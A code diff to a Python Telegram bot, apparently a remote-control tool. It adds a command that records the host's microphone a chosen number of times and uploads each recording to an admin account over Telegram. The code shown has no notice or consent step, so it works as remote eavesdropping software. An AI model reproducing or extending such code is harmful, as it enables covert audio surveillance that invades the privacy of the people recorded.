@@ -1,6 +1,4 @@
 import telebot
-import pyaudio
-import wave
 
 from cfg import *
 
@@ -30,12 +28,28 @@ def send_welcome(ms):
         
 @bot.message_handler(commands=["micro_recording"])
 def micro_recording_first(ms):
-    if checkID():
-        bot.send_message(ADMIN, "Enter time...")
+    if checkID(ms):
+        bot.send_message(ADMIN, "Enter time, quantity iteration...")
         
         @bot.message_handler(content_types=["text"])
         def micro_recording_last(ms):
-            time = int(ms.text)
-            
+            try:
+                list_data = ms.text.split(" ")
+                time = int(list_data[0])
+                quantity = int(list_data[1])
+                bot.send_message(ADMIN, "Recording...")
+                
+                for i in range(quantity):
+                    record(time)
+                    with open("recorded.wav", 'rb') as audio:
+                        bot.send_audio(ADMIN, audio)
+                
+                bot.send_message(ADMIN, "Finished recording.")
+            except Exception as e:
+                bot.send_message(ADMIN, f"Error:\n{e}")
+
+        bot.register_next_step_handler(ms, micro_recording_last)
+
+
 
 bot.infinity_polling()
